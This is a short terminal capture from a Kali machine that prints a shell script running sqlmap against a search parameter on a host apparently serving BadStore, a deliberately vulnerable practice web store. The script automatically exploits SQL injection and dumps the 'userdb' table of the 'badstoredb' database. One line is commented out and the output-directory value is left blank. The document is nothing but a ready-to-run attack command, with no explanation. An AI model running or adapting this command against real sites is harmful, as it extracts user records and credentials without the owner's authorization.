ec2-user@kali:~/node_launcher$ cat do_sqlmap.sh
#!/bin/sh
#python3 /usr/share/sqlmap/sqlmap.py --batch -u "http://badstore.cudathon.com/cgi-bin/badstore.cgi?action=search&searchquery=1" --dump -D badstoredb -T userdb --batch
sqlmap --batch -u "http://badstore.cudathon.com/cgi-bin/badstore.cgi?action=search&searchquery=1" --dump -D badstoredb -T userdb --output-dir=
ec2-user@kali:~/node_launcher$
